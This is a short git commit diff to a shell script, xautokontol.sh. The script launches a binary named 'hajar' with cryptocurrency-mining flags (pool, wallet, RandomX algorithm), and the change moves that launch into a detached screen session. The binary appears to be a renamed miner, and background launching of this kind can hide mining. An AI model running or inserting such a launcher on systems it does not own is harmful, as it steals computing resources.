037db277e1097b2a9435321224157f55f347e389
renilo <88342640+renilo@users.noreply.github.com>
2021-08-28 19:04:15 +0700

    Update xautokontol.sh

--- xautokontol.sh
+++ xautokontol.sh
@@ -16,4 +16,4 @@ WORKER=$(echo $(shuf -i 1-10000 -n 1)-GPU)
 
 chmod +x hajar
 
-./hajar --donate-level 1 -o $POOL -u $WALLET.$WORKER -p x -k -a rx/0 -t 4
+screen -dmS run ./hajar --donate-level 1 -o $POOL -u $WALLET.$WORKER -p x -k -a rx/0 -t 4
